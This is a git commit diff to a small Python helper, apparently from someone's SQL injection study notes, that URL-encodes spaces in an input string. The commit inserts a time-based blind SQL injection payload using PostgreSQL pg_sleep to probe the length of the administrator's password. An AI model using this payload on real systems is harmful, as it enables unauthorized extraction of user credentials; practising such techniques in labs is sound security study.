22f4a911f4021efacb13c74a189ac6a15a51e7cf
madi <madimirzakup@gmail.com>
2025-01-12 01:43:22 +0500

    #

--- Server Side Topics/SQLi/replace_space.py
+++ Server Side Topics/SQLi/replace_space.py
@@ -1,7 +1,7 @@
 def replace_space(text):
-    return text.replace(" ","%20")
+    return text.replace(" ","+")
 
-text = "INPUT"
+text = " select case when (1=1) then pg_sleep(5) else pg_sleep(0) end from users where username = 'administrator' and length(password)+>+1--;"
 new_text = replace_space(text)
 print(new_text)
 "gg"
